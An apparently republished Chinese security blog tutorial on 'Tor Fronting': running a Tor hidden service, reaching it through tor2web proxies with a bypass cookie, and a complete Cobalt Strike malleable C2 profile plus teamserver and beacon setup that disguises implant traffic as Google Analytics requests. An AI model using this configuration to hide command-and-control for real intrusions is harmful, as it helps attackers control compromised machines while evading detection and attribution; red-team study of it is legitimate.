<!DOCTYPE html>
<html amp lang="en-US">
<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width,initial-scale=1,minimum-scale=1">
	<script type="application/ld+json" class="yoast-schema-graph yoast-schema-graph--main">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://uzzz.org/#website","url":"https://uzzz.org/","name":"\u6709\u7ec4\u7ec7\u5728!","potentialAction":{"@type":"SearchAction","target":"https://uzzz.org/?s={search_term_string}","query-input":"required name=search_term_string"}},{"@type":"ImageObject","@id":"https://uzzz.org/article/1247/#primaryimage","url":"http://www.4hou.com/uploads/20170303/1488523664840587.png"},{"@type":"WebPage","@id":"https://uzzz.org/article/1247/#webpage","url":"https://uzzz.org/article/1247/","inLanguage":"en-US","name":"\u9690\u533f\u7684\u653b\u51fb\u4e4b-Tor Fronting - \u6709\u7ec4\u7ec7\u5728!","isPartOf":{"@id":"https://uzzz.org/#website"},"primaryImageOfPage":{"@id":"https://uzzz.org/article/1247/#primaryimage"},"datePublished":"2017-09-20T07:10:00+00:00","dateModified":"2017-09-20T07:10:00+00:00","author":{"@id":"https://uzzz.org/#/schema/person/29673f1347b0abda5882803c72ee5a3f"}},{"@type":["Person"],"@id":"https://uzzz.org/#/schema/person/29673f1347b0abda5882803c72ee5a3f","name":"fandyvon","sameAs":[]}]}</script>
	<title>隐匿的攻击之-Tor Fronting - 有组织在!</title>
		<link rel="canonical" href="https://uzzz.org/article/1247/">
	<script type="text/javascript" src="https://cdn.ampproject.org/v0.js" async></script>
<style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
	<style amp-custom>
		/* Generic WP styling */

.alignright {
	float: right;
}

.alignleft {
	float: left;
}

.aligncenter {
	display: block;
	text-align: center;
	margin-left: auto;
	margin-right: auto;
}

.amp-wp-enforced-sizes {
	/** Our sizes fallback is 100vw, and we have a padding on the container; the max-width here prevents the element from overflowing. **/
	max-width: 100%;
	margin: 0 auto;
}


/*
 * Prevent cases of amp-img converted from img to appear with stretching by using object-fit to scale.
 * See <https://github.com/ampproject/amphtml/issues/21371#issuecomment-475443219>.
 * Also use object-fit:contain in worst case scenario when we can't figure out dimensions for an image.
 * Additionally, in side of \AMP_Img_Sanitizer::determine_dimensions() it could $amp_img->setAttribute( 'object-fit', 'contain' )
 * so that the following rules wouldn't be needed.
 */
amp-img.amp-wp-enforced-sizes[layout="intrinsic"] > img,
amp-anim.amp-wp-enforced-sizes[layout="intrinsic"] > img {
	object-fit: contain;
}

amp-fit-text blockquote,
amp-fit-text h1,
amp-fit-text h2,
amp-fit-text h3,
amp-fit-text h4,
amp-fit-text h5,
amp-fit-text h6 {
	font-size: inherit;
}

/**
 * Override a style rule in Twenty Sixteen and Twenty Seventeen.
 * It set display:none for audio elements.
 * This selector is the same, though it adds body and uses amp-audio instead of audio.
 */
body amp-audio:not([controls]) {
	display: inline-block;
	height: auto;
}

/*
 * Style the default template messages for submit-success, submit-error, and submitting. These elements are inserted
 * by the form sanitizer when a POST form lacks the action-xhr attribute.
 */
.amp-wp-default-form-message > p {
	margin: 1em 0;
	padding: 0.5em;
}

.amp-wp-default-form-message[submitting] > p,
.amp-wp-default-form-message[submit-success] > p.amp-wp-form-redirecting {
	font-style: italic;
}

.amp-wp-default-form-message[submit-success] > p:not(.amp-wp-form-redirecting) {
	border: solid 1px #008000;
	background-color: #90ee90;
	color: #000;
}

.amp-wp-default-form-message[submit-error] > p {
	border: solid 1px #f00;
	background-color: #ffb6c1;
	color: #000;
}

/* Prevent showing empty success message in the case of an AMP-Redirect-To response header. */
.amp-wp-default-form-message[submit-success] > p:empty {
	display: none;
}

amp-carousel .amp-wp-gallery-caption {
	position: absolute;
	bottom: 0;
	left: 0;
	right: 0;
	text-align: center;
	background-color: rgba(0, 0, 0, 0.5);
	color: #fff;
	padding: 1rem;
}

.wp-block-gallery[data-amp-carousel="true"] {
	display: block;
	flex-wrap: unset;
}

/* Template Styles */

.amp-wp-content,
.amp-wp-title-bar div {
		margin: 0 auto;
	max-width: 840px;
	}

html {
	background: #0a89c0;
}

body {
	background: #fff;
	color: #353535;
	font-family: Georgia, 'Times New Roman', Times, Serif;
	font-weight: 300;
	line-height: 1.75em;
}

p,
ol,
ul,
figure {
	margin: 0 0 1em;
	padding: 0;
}

a,
a:visited {
	color: #0a89c0;
}

a:hover,
a:active,
a:focus {
	color: #353535;
}

/* Quotes */

blockquote {
	color: #353535;
	background: rgba(127,127,127,.125);
	border-left: 2px solid #0a89c0;
	margin: 8px 0 24px 0;
	padding: 16px;
}

blockquote p:last-child {
	margin-bottom: 0;
}

/* UI Fonts */

.amp-wp-meta,
.amp-wp-header div,
.amp-wp-title,
.wp-caption-text,
.amp-wp-tax-category,
.amp-wp-tax-tag,
.amp-wp-comments-link,
.amp-wp-footer p,
.back-to-top {
	font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", "Roboto", "Oxygen-Sans", "Ubuntu", "Cantarell", "Helvetica Neue", sans-serif;
}

/* Header */

.amp-wp-header {
	background-color: #0a89c0;
}

.amp-wp-header div {
	color: #fff;
	font-size: 1em;
	font-weight: 400;
	margin: 0 auto;
	max-width: calc(840px - 32px);
	padding: .875em 16px;
	position: relative;
}

.amp-wp-header a {
	color: #fff;
	text-decoration: none;
}


.amp-wp-header .amp-wp-site-icon {
	/** site icon is 32px **/
	background-color: #fff;
	border: 1px solid #fff;
	border-radius: 50%;
	position: absolute;
	right: 18px;
	top: 10px;
}

/* Article */

.amp-wp-article {
	color: #353535;
	font-weight: 400;
	margin: 1.5em auto;
	max-width: 840px;
	overflow-wrap: break-word;
	word-wrap: break-word;
}

/* Article Header */

.amp-wp-article-header {
	align-items: center;
	align-content: stretch;
	display: flex;
	flex-wrap: wrap;
	justify-content: space-between;
	margin: 1.5em 16px 0;
}

.amp-wp-title {
	color: #353535;
	display: block;
	flex: 1 0 100%;
	font-weight: 900;
	margin: 0 0 .625em;
	width: 100%;
}

/* Article Meta */

.amp-wp-meta {
	color: #696969;
	display: inline-block;
	flex: 2 1 50%;
	font-size: .875em;
	line-height: 1.5em;
	margin: 0 0 1.5em;
	padding: 0;
}

.amp-wp-article-header .amp-wp-meta:last-of-type {
	text-align: right;
}

.amp-wp-article-header .amp-wp-meta:first-of-type {
	text-align: left;
}

.amp-wp-byline amp-img,
.amp-wp-byline .amp-wp-author {
	display: inline-block;
	vertical-align: middle;
}

.amp-wp-byline amp-img {
	border: 1px solid #0a89c0;
	border-radius: 50%;
	position: relative;
	margin-right: 6px;
}

.amp-wp-posted-on {
	text-align: right;
}

/* Featured image */

.amp-wp-article-featured-image {
	margin: 0 0 1em;
}
.amp-wp-article-featured-image amp-img {
	margin: 0 auto;
}
.amp-wp-article-featured-image.wp-caption .wp-caption-text {
	margin: 0 18px;
}

/* Article Content */

.amp-wp-article-content {
	margin: 0 16px;
}

.amp-wp-article-content ul,
.amp-wp-article-content ol {
	margin-left: 1em;
}

.amp-wp-article-content .wp-caption {
	max-width: 100%;
}

.amp-wp-article-content amp-img {
	margin: 0 auto;
}

.amp-wp-article-content amp-img.alignright {
	margin: 0 0 1em 16px;
}

.amp-wp-article-content amp-img.alignleft {
	margin: 0 16px 1em 0;
}

/* Captions */

.wp-caption {
	padding: 0;
}

.wp-caption.alignleft {
	margin-right: 16px;
}

.wp-caption.alignright {
	margin-left: 16px;
}

.wp-caption .wp-caption-text {
	border-bottom: 1px solid #c2c2c2;
	color: #696969;
	font-size: .875em;
	line-height: 1.5em;
	margin: 0;
	padding: .66em 10px .75em;
}

/* AMP Media */

.alignwide,
.alignfull {
	clear: both;
}

amp-carousel {
	background: #c2c2c2;
	margin: 0 -16px 1.5em;
}
amp-iframe,
amp-youtube,
amp-instagram,
amp-vine {
	background: #c2c2c2;
	margin: 0 -16px 1.5em;
}

.amp-wp-article-content amp-carousel amp-img {
	border: none;
}

amp-carousel > amp-img > img {
	object-fit: contain;
}

.amp-wp-iframe-placeholder {
	background: #c2c2c2 url( https://uzzz.org/wp-content/plugins/amp/assets/images/placeholder-icon.png ) no-repeat center 40%;
	background-size: 48px 48px;
	min-height: 48px;
}

/* Article Footer Meta */

.amp-wp-article-footer .amp-wp-meta {
	display: block;
}

.amp-wp-tax-category,
.amp-wp-tax-tag {
	color: #696969;
	font-size: .875em;
	line-height: 1.5em;
	margin: 1.5em 16px;
}

.amp-wp-comments-link {
	color: #696969;
	font-size: .875em;
	line-height: 1.5em;
	text-align: center;
	margin: 2.25em 0 1.5em;
}

.amp-wp-comments-link a {
	border-style: solid;
	border-color: #c2c2c2;
	border-width: 1px 1px 2px;
	border-radius: 4px;
	background-color: transparent;
	color: #0a89c0;
	cursor: pointer;
	display: block;
	font-size: 14px;
	font-weight: 600;
	line-height: 18px;
	margin: 0 auto;
	max-width: 200px;
	padding: 11px 16px;
	text-decoration: none;
	width: 50%;
	-webkit-transition: background-color 0.2s ease;
			transition: background-color 0.2s ease;
}

/* AMP Footer */

.amp-wp-footer {
	border-top: 1px solid #c2c2c2;
	margin: calc(1.5em - 1px) 0 0;
}

.amp-wp-footer div {
	margin: 0 auto;
	max-width: calc(840px - 32px);
	padding: 1.25em 16px 1.25em;
	position: relative;
}

.amp-wp-footer h2 {
	font-size: 1em;
	line-height: 1.375em;
	margin: 0 0 .5em;
}

.amp-wp-footer p {
	color: #696969;
	font-size: .8em;
	line-height: 1.5em;
	margin: 0 85px 0 0;
}

.amp-wp-footer a {
	text-decoration: none;
}

.back-to-top {
	bottom: 1.275em;
	font-size: .8em;
	font-weight: 600;
	line-height: 2em;
	position: absolute;
	right: 16px;
}
		/* Inline stylesheets */
.htmledit_views{font-family:-apple-system,SF UI Text,Arial,PingFang SC,Hiragino Sans GB,Microsoft YaHei,WenQuanYi Micro Hei,sans-serif,SimHei,SimSun}.htmledit_views a>amp-img{padding:1px;margin:1px;border:none;outline:#0782c1 solid 1px}.htmledit_views p{font-size:16px;color:#4d4d4d;font-weight:400;line-height:26px;margin:0 0 16px;overflow-x:auto}.htmledit_views amp-img{max-width:100%}.htmledit_views strong,.htmledit_views strong span{font-weight:700}.htmledit_views *{box-sizing:border-box}.htmledit_views blockquote{display:block;padding:16px 16px 0;margin:0 0 24px;border-left:8px solid #dddfe4;background:#eef0f4;overflow:auto;overflow-scrolling:touch;word-wrap:normal;word-break:normal}.htmledit_views blockquote p{font-size:16px;line-height:26px;font-weight:400;margin-bottom:16px;color:#4f4f4f}.htmledit_views pre{white-space:pre-wrap;word-wrap:break-word;margin:0 0 24px;overflow-x:auto;padding:8px}.htmledit_views pre{font-family:Consolas,Inconsolata,Courier,monospace;font-size:14px;line-height:22px;color:#000}.htmledit_views pre code,.htmledit_views pre code div,.htmledit_views pre code span{font-family:"Source Code Pro","DejaVu Sans Mono","Ubuntu Mono","Anonymous Pro","Droid Sans Mono",Menlo,Monaco,Consolas,Inconsolata,Courier,monospace,"PingFang SC","Microsoft YaHei",sans-serif}.htmledit_views code{border-radius:4px}.htmledit_views a{color:#4ea1db;text-decoration:none}.htmledit_views a:focus,.htmledit_views a:hover{color:#ca0c16}.htmledit_views a:visited{color:#6795b5}.htmledit_views pre code{display:block;line-height:22px;overflow-x:auto;white-space:pre;word-wrap:normal;border-radius:4px;padding:8px}.htmledit_views pre code:not(.hljs){background-color:#f3f4f5}.htmledit_views pre code,.htmledit_views pre code div,.htmledit_views pre code span{font-size:14px}:root:not(#_):not(#_):not(#_):not(#_):not(#_) .amp-wp-82ddacf{font-size:20px;color:#333;font-family:"Microsoft YaHei";line-height:26px}:root:not(#_):not(#_):not(#_):not(#_):not(#_) .amp-wp-3c9c573{font-family:"Microsoft YaHei";border-left:none}:root:not(#_):not(#_):not(#_):not(#_):not(#_) .amp-wp-aa3848d{color:#666;font-size:16px;line-height:26px}:root:not(#_):not(#_):not(#_):not(#_):not(#_) .amp-wp-c06db0c{font-family:"Microsoft YaHei";color:#333;line-height:26px;text-align:center}:root:not(#_):not(#_):not(#_):not(#_):not(#_) .amp-wp-d40a98b{width:680px}:root:not(#_):not(#_):not(#_):not(#_):not(#_) .amp-wp-ff9ec5b{font-size:20px}:root:not(#_):not(#_):not(#_):not(#_):not(#_) .amp-wp-28d5888{line-height:26px}:root:not(#_):not(#_):not(#_):not(#_):not(#_) .amp-wp-50bfe14{font-family:"Microsoft YaHei";color:#333;line-height:26px}	</style>
</head>

<body class="">

<header id="top" class="amp-wp-header">
	<div>
		<a href="https://uzzz.org/">
										<amp-img src="https://uzzz.org/wp-content/uploads/2019/10/cropped-icon-32x32.png" width="32" height="32" class="amp-wp-site-icon"></amp-img>
						<span class="amp-site-title">
				有组织在!			</span>
		</a>

					</div>
</header>

<article class="amp-wp-article">
	<header class="amp-wp-article-header">
		<h1 class="amp-wp-title">隐匿的攻击之-Tor Fronting</h1>
			<div class="amp-wp-meta amp-wp-byline">
					<amp-img src="https://secure.gravatar.com/avatar/e786821a74ef0467825a7d60183307bc?s=24&d=mm&r=g" alt="fandyvon" width="24" height="24" layout="fixed"></amp-img>
				<span class="amp-wp-author author vcard">fandyvon</span>
	</div>
<div class="amp-wp-meta amp-wp-posted-on">
	<time datetime="2017-09-20T15:10:00+00:00">
		2 years ago	</time>
</div>
	</header>

	
	<div class="amp-wp-article-content">
		<div id="article_content" class="article_content clearfix">
<div class="article-source-link">
   原文链接：<br>
  <a href="https://yq.aliyun.com/articles/220340" target="_blank" rel="noopener noreferrer">https://yq.aliyun.com/articles/220340</a>
 </div>

 
<div class="htmledit_views" id="content_views">
<div class="content-detail markdown-body">
<div>
    本文讲的是<br>
    <b>隐匿的攻击之-Tor Fronting</b>，
   </div>
<div>
    <strong class="amp-wp-82ddacf"><br></strong>
   </div>
<div>
    <strong class="amp-wp-82ddacf">0x01 简介</strong>
   </div>
<p class="amp-wp-50bfe14">学习完<span>Domain Fronting</span>之后，又从<span>@vysecurity</span>的文章里学会了一个新的姿势–Tor Fronting,使用Tor Fronting ，同样能在攻击中隐藏自己，并且更加容易实现，此文就来介绍一下这个新的姿势。</p>
<p class="amp-wp-50bfe14"><span class="amp-wp-ff9ec5b"><strong class="amp-wp-28d5888">0x02 Tor Hidden Services</strong></span></p>
<p class="amp-wp-50bfe14">Tor是互联网上用于保护您隐私最有力的工具之一，而Tor Hidden Services则是为了隐藏自己的网站或者其他服务的一个服务。通过此服务，我们可以获取到一个通过Tor Browser来访问的Hostname，此Hostname唯一且匿名，所以我们完全可以使用这个Hostname来为我们转发流量从而达到隐匿的目的。</p>
<p class="amp-wp-50bfe14">怎样搭建Tor Hidden Services可以参考此<span>wiki</span>，下面介绍一下我测试环境的搭建过程。 <br> 环境为：Ubuntu 12.04 <br> 搭建过程如下： <br> 查看系统信息:</p>
<pre>lsb_release -a</pre>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488523664840587.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="193" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488523664840587.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="193" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">可以看到Codename为precise，所以在<span>这里</span>选择deb类型如下：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488523712445346.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="303" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488523712445346.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="303" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">之后按照官方wiki修改更新源，我的源路径为/etc/apt/sources.list，有的系统更新源路径可能在/etc/apt/sources.list.d/，在源中添加以下条目：</p>
<pre>deb http://deb.torproject.org/torproject.org precise main
deb-src http://deb.torproject.org/torproject.org precise main</pre>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488523753277661.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="235" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488523753277661.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="235" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">之后执行以下命令:</p>
<pre>gpg --keyserver keys.gnupg.net --recv A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89
gpg --export A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89 | sudo apt-key add -</pre>
<p class="amp-wp-50bfe14">安装：</p>
<pre>$ sudo apt-get update
$ sudo apt-get install tor deb.torproject.org-keyring</pre>
<p class="amp-wp-50bfe14">执行完成以后，就成功安装了，如果出现问题，可以查看一下wiki。</p>
<p class="amp-wp-50bfe14">之后要对tor进行一下配置，编辑配置文件/etc/tor/torrc，将以下两个参数前的注释去掉。</p>
<pre>HiddenServiceDir /var/lib/tor/hidden_service/
HiddenServicePort 80 127.0.0.1:8080</pre>
<blockquote class="amp-wp-3c9c573">
<p class="amp-wp-aa3848d">HiddenServicePort为代理的端口，将本地的8080端口服务转发到80端口。</p>
</blockquote>
<p class="amp-wp-50bfe14">配置完成以后对Tor服务进行重启：</p>
<pre>sudo service tor restart</pre>
<p class="amp-wp-50bfe14">查看获取到的hostname:</p>
<pre>sudo cat /var/lib/tor/hidden_service/hostname</pre>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488523808853156.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="62" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488523808853156.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="62" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">其中xxxxx.onion则为我们的Tor隐藏服务。通过访问这个地址，可以访问到我们服务器8080端口的服务，下面进行一下测试。 <br> 开启8080端口的服务：</p>
<pre>  ~  cd /tmp
  ~  python -m SimpleHTTPServer 8080
Serving HTTP on 0.0.0.0 port 8080 ...</pre>
<p class="amp-wp-50bfe14">使用tor浏览器访问此域名，可看到8080端口的响应：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488523856653801.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="335" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488523856653801.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="335" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14"><span class="amp-wp-ff9ec5b"><strong class="amp-wp-28d5888">0x03 Tor2Web</strong></span></p>
<p class="amp-wp-50bfe14">要对这个隐藏server进行利用，需要借助于一个代理，即<span>tor2web</span>，因为要想访问到隐藏服务，直接通过一般浏览器是不行的，所以，可以借助于tor2web，需要做的也很简单，当我们访问形如http://duskgytldkxiuqc6.onion/的链接时，直接修改.onion成.onion.to或.onion.city 或 onion.cab 或者任何一个提供此服务的域名即可。如下图：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488523907610033.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="312" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488523907610033.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="312" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">当然，这里会有一个问题，就是访问的时候，会需要我们点击一个按钮才能正常访问，如下图：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488523950633919.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="400" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488523950633919.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="400" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">那么怎么样才能直接访问呢，很简单，只需要带上点击以后的cookie就可以了，测试如下：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488524056302821.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="121" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488524056302821.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="121" class="amp-wp-d40a98b"></noscript></amp-img></p>
<pre>curl -b 'onion_cab_iKnowShit=yourcookie'  'https://xxxx.onion.cab/1.txt'</pre>
<p class="amp-wp-50bfe14"><span class="amp-wp-ff9ec5b"><strong class="amp-wp-28d5888">0x04 Cobalt Strike</strong></span></p>
<p class="amp-wp-50bfe14">同样的，我们使用Cobalt Strike来进行测试。这里需要配置一个新的profile，@vysecurity已经提供了一个，具体如下： <br> tor-fronting.profile</p>
<pre># make our C2 look like a Google Web Bug
# https://developers.google.com/analytics/resources/articles/gaTrackingTroubleshooting
#
# Author: @armitagehacker
# Modified by Vincent Yiu @vysecurity for TOR.
set sleeptime "5000";
http-get {
        set uri "/___utm";
        client {
                header "Host" "bjaw6h36vwruhwvb.onion.cab";
                header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d";
                metadata {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }
        server {
                header "Content-Type" "plain/text";
                output {
                        # hexdump pixel.gif
                        # 0000000 47 49 46 38 39 61 01 00 01 00 80 00 00 00 00 00
                        # 0000010 ff ff ff 21 f9 04 01 00 00 00 00 2c 00 00 00 00
                        # 0000020 01 00 01 00 00 02 01 44 00 3b
                        prepend "x01x00x01x00x00x02x01x44x00x3b";
                        prepend "xffxffxffx21xf9x04x01x00x00x00x2cx00x00x00x00";
                        prepend "x47x49x46x38x39x61x01x00x01x00x80x00x00x00x00";
                        print;
                }
        }
}
http-post {
        set uri "/__utm";
        set verb "GET";
        client {
                header "Host" "bjaw6h36vwruhwvb.onion.cab";
                header "Cookie" "onion_cab_iKnowShit=8919090b066c57c2638a0956e1af4e8d";
                id {
                        prepend "UA-220";
                        append "-2";
                        parameter "utmac";
                }
                output {
                        base64url;
                        prepend "__utma";
                        parameter "utmcc";
                }
        }
        server {
                header "Content-Type" "plain/text";
                output {
                        prepend "x01x00x01x00x00x02x01x44x00x3b";
                        prepend "xffxffxffx21xf9x04x01x00x00x00x2cx00x00x00x00";
                        prepend "x47x49x46x38x39x61x01x00x01x00x80x00x00x00x00";
                        print;
                }
        }
}
# dress up the staging process too
http-stager {
        server {
                header "Content-Type" "plain/text";
        }
}</pre>
<p class="amp-wp-50bfe14">在这里需要注意的是，我们需要修改Get以及Post中的Host及Cookie为自己的。当然，如果你想让数据包呈现别的样子，你也可以自己再写一个profile。</p>
<p class="amp-wp-50bfe14">开启teamserver：</p>
<pre>  cobal  sudo ./teamserver [your ip] hacktest tor-fronting.profile</pre>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488524105436218.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="163" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488524105436218.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="163" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">连接到Teamserver，之后创建监听：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488524152291843.png" title="" alt="隐匿的攻击之-Tor Fronting" object-fit="contain" width="840" height="400" class="amp-wp-unknown-size amp-wp-unknown-width amp-wp-unknown-height amp-wp-enforced-sizes" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488524152291843.png" title="" alt="隐匿的攻击之-Tor Fronting" width="840" height="400" class="amp-wp-unknown-size amp-wp-unknown-width amp-wp-unknown-height"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">因为onion.cab使用的https，所以我们需要生成一个HTTPS Beacon，Host随意输入一个域名，端口一定要改成443。</p>
<p class="amp-wp-50bfe14">使用onion.cab:</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488524182176629.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="270" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488524182176629.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="270" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">生成HTTPS Beacon：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488524219815277.png" title="" alt="隐匿的攻击之-Tor Fronting" object-fit="contain" width="840" height="400" class="amp-wp-unknown-size amp-wp-unknown-width amp-wp-unknown-height amp-wp-enforced-sizes" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488524219815277.png" title="" alt="隐匿的攻击之-Tor Fronting" width="840" height="400" class="amp-wp-unknown-size amp-wp-unknown-width amp-wp-unknown-height"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">生成HTTPS Beacon以后，要修改监听到8080端口，并且使用HTTP，因为这是tor转发的服务。 <br> 选择Edit：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488524248686330.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="195" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488524248686330.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="195" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">修改参数如下：</p>
<p class="amp-wp-c06db0c"> <amp-img src="http://www.4hou.com/uploads/20170303/1488524287537751.png" title="" alt="隐匿的攻击之-Tor Fronting" object-fit="contain" width="840" height="400" class="amp-wp-unknown-size amp-wp-unknown-width amp-wp-unknown-height amp-wp-enforced-sizes" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488524287537751.png" title="" alt="隐匿的攻击之-Tor Fronting" width="840" height="400" class="amp-wp-unknown-size amp-wp-unknown-width amp-wp-unknown-height"></noscript></amp-img></p>
<p class="amp-wp-50bfe14">保存之后，运行HTTPS beacon，成功上线：</p>
<p class="amp-wp-c06db0c"><amp-img src="http://www.4hou.com/uploads/20170303/1488524335412351.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="477" class="amp-wp-enforced-sizes amp-wp-d40a98b" layout="intrinsic"><noscript><img src="http://www.4hou.com/uploads/20170303/1488524335412351.png" title="" alt="隐匿的攻击之-Tor Fronting" width="680" height="477" class="amp-wp-d40a98b"></noscript></amp-img></p>
<p class="amp-wp-50bfe14"><span class="amp-wp-ff9ec5b"><strong class="amp-wp-28d5888">0x05 小结</strong></span></p>
<p class="amp-wp-50bfe14">使用Tor Fronting 有以下几个特点： </p>
<pre><code class="language-html">1、你不需要外网环境，将C2放到Docker或者本地都可以！（但是需要服务器在墙外） 
2、使C2匿名； 
3、并不需要在目标机上安装Tor； 
4、默认是安全的。 
5、要求C2上同时安装Cobalt Strike及Tor服务。</code></pre>
<p class="amp-wp-50bfe14">通过流量转发来隐藏自己的真正服务器是隐藏的关键，而如何寻找转发和怎么样使用它是很有趣的过程，希望文章能给你有所启发。</p>
<div>
    
   </div>
<div>
    
   </div>
<div>
    
   </div>
<div>
    原文发布时间为：2017年3月6日
   </div>
<div>
    本文作者：Evi1cg
   </div>
<div>
    本文来自云栖社区合作伙伴嘶吼，了解相关信息可以关注嘶吼网站。
   </div>
<div>
    <a href="http://www.4hou.com/technology/3516.html" rel="nofollow" data-token="14dfeebfe8fda133b9043ee91150729f">原文链接</a>
   </div>
</div>
</div>
</div>
	</div>

	<footer class="amp-wp-article-footer">
			<div class="amp-wp-meta amp-wp-tax-category">
		Categories: Uncategorized	</div>

	</footer>
</article>

<footer class="amp-wp-footer">
	<div>
		<h2>有组织在!</h2>
		<a href="#top" class="back-to-top">Back to top</a>
	</div>
</footer>



</body>
</html>
